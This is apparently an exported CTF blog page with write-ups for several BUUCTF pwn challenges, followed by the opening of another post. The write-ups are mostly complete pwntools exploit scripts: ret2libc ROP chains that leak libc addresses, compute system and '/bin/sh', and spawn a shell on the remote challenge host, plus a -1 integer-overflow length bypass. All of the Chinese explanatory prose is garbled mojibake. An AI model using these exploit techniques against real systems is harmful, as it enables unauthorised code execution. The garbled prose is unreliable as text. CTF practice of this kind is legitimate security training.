<p>è¿™ä¸€é“é¢˜æ˜¯64ä½çš„ç¨‹åºï¼Œè¿™è¾¹æ¶‰åŠåˆ°64ä½ç¨‹åºå’Œ32ä½ç¨‹åºè¿è¡Œæ—¶çš„åŒºåˆ«äº†<br>32ä½ç¨‹åºè¿è¡Œæ‰§è¡ŒæŒ‡ä»¤çš„æ—¶å€™ç›´æ¥å»å†…å­˜åœ°å€å¯»å€æ‰§è¡Œ<br>64ä½ç¨‹åºåˆ™æ˜¯é€šè¿‡å¯„å­˜å™¨æ¥ä¼ å€ï¼Œå¯„å­˜å™¨å»å†…å­˜å¯»å€ï¼Œæ‰¾åˆ°åœ°å€è¿”å›ç»™ç¨‹åºã€‚å› æ­¤è¦ç”¨å¯„å­˜å™¨å­˜å‚<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915046.webp"></p>
<p>æ³¨æ„æ ˆå¯¹é½<br><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081258686.webp"></p>
<p>è¿˜æœ‰æœ€åè¿˜è¦å†è¾“ä¸€ä¸ª0</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308071915042.webp"></p>
<p>å‚è€ƒèµ„æ–™ï¼š<br>  <a href="http://t.csdn.cn/m6si5">[BUUCTF]PWN6â€”â€”ciscn_2019_c_1</a></p>
<h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>BUUCTF pwn<br>è€ƒç‚¹ï¼š ret2libc3</p>
<h2 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h2><p>64ä½ç¨‹åºï¼Œå¼€å¯NX</p>
<p>æ²¡æœ‰systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p>
<h2 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h2><p>åˆ†æç¨‹åºï¼š mainå‡½æ•°ä¸­ï¼Œå…ˆè¯»å–ä¸€ä¸ªéšæœºæ•°åˆ°fdï¼Œå¹¶ä½œä¸ºå‚æ•°ä¼ å…¥sub_804871Få‡½æ•°ï¼Œå†å°†sub_804871Få‡½æ•°çš„è¿”å›å€¼ä½œä¸ºå‚æ•°ä¼ å…¥sub_80487D0å‡½æ•°é‡Œã€‚</p>
<p>mainå‡½æ•°</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142732.png" alt="image-20230807205450139"></p>
<p>sub_804871Få‡½æ•°</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142587.png" alt="image-20230807205837589"></p>
<p>sub_80487D0å‡½æ•°</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072142267.png" alt="image-20230807205912958"></p>
<p>è§‚å¯Ÿç¨‹åºæˆ‘ä»¬å¯ä»¥å‘ç°sub_80487D0å‡½æ•°æœ‰æ ˆæº¢å‡ºæ¼æ´</p>
<p>ç„¶è€Œæƒ³è¦åˆ©ç”¨æ ˆæº¢å‡ºéœ€è¦æˆ‘ä»¬è¾¾æˆä¸¤ä¸ªç›®æ ‡</p>
<p>1ã€ç»•è¿‡sub_804871Få‡½æ•°ä¸­çš„exitå‡½æ•°ï¼Œè¿™å°±è¦è®©strncmpçš„è¿”å›å€¼ä¸º0</p>
<p>2ã€è®©sub_80487D0å‡½æ•°ä¸­a1ï¼ˆå³buf[7]ï¼‰çš„ASCIIç å€¼å°½å¯èƒ½å¤§ï¼Œæ„é€ æ ˆæº¢å‡º</p>
<h2 id="0x03-2"><a href="#0x03-2" class="headerlink" title="0x03"></a>0x03</h2><p>é¦–å…ˆç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œbufå’Œsæ•°ç»„å®Œå…¨ç›¸ç­‰æ—¶ï¼Œstrncmpå‡½æ•°è¿”å›0ï¼Œä½†æ˜¯sprinfå‡½æ•°å°†éšæœºæ•°åŠ åˆ°äº†sæ•°ç»„ä¸­ï¼Œbufä¸så¾ˆéš¾ç›¸ç­‰ã€‚ä¸è¿‡åœ¨v1ä¸º0çš„æ—¶å€™strncmpå‡½æ•°ä¹Ÿæ˜¯ä¼šè¿”å›0çš„ï¼Œè€Œv1æ˜¯è¯»å–çš„bufçš„å¤§å°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶bufçš„ç¬¬ä¸€ä½ä¸ºâ€™\x00â€™ï¼Œå¯èµ·åˆ°æˆªæ–­å­—ç¬¦ä¸²é•¿åº¦çš„æ•ˆæœã€‚</p>
<p>ç¬¬äºŒæ­¥ï¼Œè‹¥è¦åˆ©ç”¨æ ˆæº¢å‡ºret2libcæ³„éœ²writeå‡½æ•°åœ°å€çš„è¯ï¼Œèµ·ç éœ€è¦231+4+4*5 &#x3D; 255ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è®©buf[7] &#x3D; â€˜\xffâ€™å³å¯ã€‚ä»£ç ä¸­çš„buf[v5-1] &#x3D; 0æ”¹å˜çš„æ˜¯å­—ç¬¦ä¸²æœ«å°¾â€™\x00â€™çš„å€¼ï¼Œä¸å½±å“buf[7] ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ¬¡è¯»å–çš„payloadä¸º</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="0x04-2"><a href="#0x04-2" class="headerlink" title="0x04"></a>0x04</h2><p>æ³¨æ„æœ¬é¢˜æä¾›äº†libcï¼Œç›´æ¥ä½¿ç”¨pwntoolså·¥å…·å³å¯ï¼Œä¸å¿…ä½¿ç”¨LibcSearcher</p>
<p>mainå‡½æ•°åœ°å€ç”¨elf.sym[â€˜mainâ€™]æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œobjdump -tå‘½ä»¤æŸ¥çœ‹å‘ç°ç¨‹åºæ²¡æœ‰ç¬¦å·è¡¨ï¼ŒåŸå› åº”è¯¥æ˜¯å‡ºé¢˜äººä½¿ç”¨stripå‘½ä»¤å»ç¬¦å·è¡¨äº†</p>
<p>å®Œæ•´exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"><span class="comment">#main_addr = elf.plt[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x8048825</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">libc_base = write_addr -  libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Correct\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe7</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h1><p>ç»å…¸ret2libc3</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28146</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;write&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(<span class="number">1</span>)+p32(got_addr)+p32(<span class="number">0xD</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])<span class="comment">#0xf7db1190</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write_addr = &quot;</span>,<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h2><p>32ä½å¼€NXæ³„éœ²libc</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p>
<p>æ³¨æ„get_næ˜¯è‡ªå®šä¹‰å‡½æ•°</p>
<p>è§„å®šè¯»å…¥v2é•¿åº¦çš„å­—ç¬¦ï¼Œä½†æ˜¯ç¨‹åºè¦æ±‚v2ä¸å¤§äº32ã€‚è§‚å¯Ÿåˆ°intå‹çš„v2ä¼ å…¥unsigned intå‹çš„a2ï¼Œå¯ä»¥ä¼ å…¥-1æ•´æ•°æº¢å‡ºç»•è¿‡ã€‚</p>
<p>ROPé“¾æ³„éœ²libcï¼Œæº¢å‡ºè¦†ç›–è¿”å›åœ°å€getshell</p>
<h2 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn0&#x27;) </span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26602</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn0&#x27;</span>) </span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">plt_addr  = elf.plt[<span class="string">&#x27;printf&#x27;</span>]	</span><br><span class="line">got_addr  = elf.got[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">fmt = <span class="number">0x080486F</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¬¬ä¸€è¡Œçš„æ‰æ­£ç¡®ï¼Ÿ</span></span><br><span class="line">pay1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr)</span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span></span><br><span class="line"><span class="comment">#pay1 = b&#x27;a&#x27;*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getchar_addr= u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment">#getchar_addr = u32(p.recv()[0:4])å˜æˆæ¥æ”¶å‰é¢å››ä¸ªå­—èŠ‚äº†</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;getchar_addr = &quot;</span>,<span class="built_in">hex</span>(getchar_addr))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc=LibcSearcher(&#x27;getchar&#x27;,getchar_addr)</span></span><br><span class="line"><span class="string">offset=getchar_addr-libc.dump(&#x27;getchar&#x27;)</span></span><br><span class="line"><span class="string">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">system=offset+libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">base_addr = getchar_addr - libc.symbols[<span class="string">&#x27;getchar&#x27;</span>]</span><br><span class="line">system = libc.symbols[<span class="string">&#x27;system&#x27;</span>] + base_addr</span><br><span class="line">binsh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__() + base_addr</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base_addr = &quot;</span>,<span class="built_in">hex</span>(base_addr))</span><br><span class="line"><span class="comment">#print(&quot;libc_base_addr = &quot;,hex(offset))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sys_addr = &quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;sh_addr = &quot;</span>,<span class="built_in">hex</span>(binsh))</span><br><span class="line">pay2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;How many bytes do you want me to read?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>64ä½ï¼Œä¸32ä½ä¼ å‚æœ‰åŒºåˆ«</p>
<p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p>
<p>æ€è·¯ï¼š</p>
<ol>
<li>åˆ©ç”¨putså‡½æ•°æ³„éœ²å‡ºputså‡½æ•°çœŸå®åœ°å€</li>
<li>é€šè¿‡putså‡½æ•°åœ°å€è®¡ç®—å‡ºlibcåŸºåœ°å€ï¼Œä»è€Œè®¡ç®—å‡ºsystemå’Œbinshçš„çœŸå®åœ°å€</li>
<li>æ„é€ ropé“¾æ ˆæº¢å‡ºgetshell</li>
</ol>
<p>putså‡½æ•°é€šè¿‡pop rdi ; ret ä¼ å‚</p>
<p>ç”¨ROPgadgetå¯ä»¥æ‰¾åˆ°</p>
<h2 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"> </span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">	<span class="keyword">if</span> content == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&#x27;./pwn&#x27;</span>) </span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29917</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#elf</span></span><br><span class="line">	main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">	plt_addr  = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	got_addr  = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	pop_rdi   = <span class="number">0x0400733</span></span><br><span class="line">	ret_addr  = <span class="number">0x04004c9</span></span><br><span class="line">	</span><br><span class="line">	payload   = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#libc</span></span><br><span class="line">	lib 	        = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr) </span><br><span class="line">	lib_puts_addr   = lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">	lib_system_addr = lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">	lib_bin_addr    = lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">#base</span></span><br><span class="line">	base_addr       = puts_addr - lib_puts_addr</span><br><span class="line">	system_addr	= base_addr + lib_system_addr</span><br><span class="line">	bin_addr	= base_addr + lib_bin_addr</span><br><span class="line">	payload		= <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">0x8</span>) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr)</span><br><span class="line">	p.recvuntil(<span class="string">&quot;Pull up your sword and tell me u story!\n&quot;</span>)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line">	</span><br><span class="line">	p.interactive()</span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64ä½çš„ret2libc3</p>
<h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p><img data-src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p>
<p>åˆ©ç”¨printfæ³„éœ²libcç‰ˆæœ¬å’ŒåŸºåœ°å€ï¼Œä¼ å‚çš„æ—¶å€™éœ€è¦ä¼ å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²%sç»™å¯„å­˜å™¨rdiï¼ˆç¨‹åºä¸­ç¬¬äºŒä¸ªprintfå‡½æ•°è‡ªå¸¦ï¼Œè¿”å›è‡³è¯¥æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ°å€å³å¯ï¼‰ï¼›å¹¶å°†æƒ³è¦æ³„éœ²çš„read_gotä¼ ç»™å¯„å­˜å™¨ã€‚</p>
<h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25502</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./babyrop2&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸€å®šè¦ç”¨é¢˜ç›®ç»™çš„libcæ–‡ä»¶ï¼Œå¯èƒ½å¿…é¡»è¦ç”¨é¢˜ç›®ç»™çš„æ‰èƒ½æ‰“é€š</span></span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_plt = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">fmt = <span class="number">0x0000000000400790</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)+p64(printf_plt)+p64(main_plt)</span><br><span class="line">p.recvuntil(<span class="string">&quot;name? &quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read_addr ======&gt;&gt; &quot;</span>+<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc_base = read_addr -  libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr=libc_base+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>retlibcåˆé›†</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>week1 T1</title>
    <url>/posts/5331bd59/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-test-your-nc"><a href="#T1-test-your-nc" class="headerlink" title="T1 test_your_nc"></a>T1 test_your_nc</h2><blockquote>
<p>2023-01-03WP<br>BUUCTF pwnç¬¬ä¸€é¢˜</p>
</blockquote>
<span id="more"></span>

<h3 id="ä¸€ã€ç”¨checksecæ£€æµ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶"><a href="#ä¸€ã€ç”¨checksecæ£€æµ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶" class="headerlink" title="ä¸€ã€ç”¨checksecæ£€æµ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶"></a>ä¸€ã€ç”¨checksecæ£€æµ‹æ–‡ä»¶ä¿æŠ¤æœºåˆ¶</h3><p>ä¸‹è½½æ–‡ä»¶ï¼Œchecksecå¾—çŸ¥å·²å¼€å¯NXä¿æŠ¤<br><img data-src="https://pic2.zhimg.com/80/v2-e67d3c6a1857cc38c34efd40ed29e80d_1440w.webp"><br>ï¼ˆå¥‡æ€ªçš„æ˜¯checksecæ²¡æœ‰ç»™å‡ºæ–‡ä»¶ä½æ•°ï¼Œåæ¥è¿˜æ˜¯fileäº†ä¸€ä¸‹å¾—åˆ°æ˜¯64ä½ï¼‰</p>
